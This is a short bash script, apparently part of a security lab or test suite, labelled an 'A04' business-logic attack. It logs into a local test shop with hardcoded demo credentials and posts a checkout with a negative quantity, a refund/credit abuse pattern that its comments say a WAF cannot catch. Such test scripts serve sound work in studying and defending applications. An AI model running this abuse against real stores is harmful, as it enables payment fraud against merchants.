#!/usr/bin/env bash
# A04 attack: business-logic abuse. Check out a negative quantity. The request
# is well-formed; no attack signature for the WAF. Only the app's rule rejects
# it. A negative qty against a positive unit price is the classic refund/credit
# abuse pattern.
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)/scripts/env.sh"
tok=$(C -X POST -H 'Content-Type: application/json' \
      -d '{"email":"maya@logsting.test","password":"sunshine"}' \
      "$BASE/api/login" | jq -r '.token')
C -X POST -H 'Content-Type: application/json' -H "Authorization: Bearer $tok" \
  -d '{"sku":"sku-blue-shoe","qty":-5}' "$BASE/api/checkout" >/dev/null
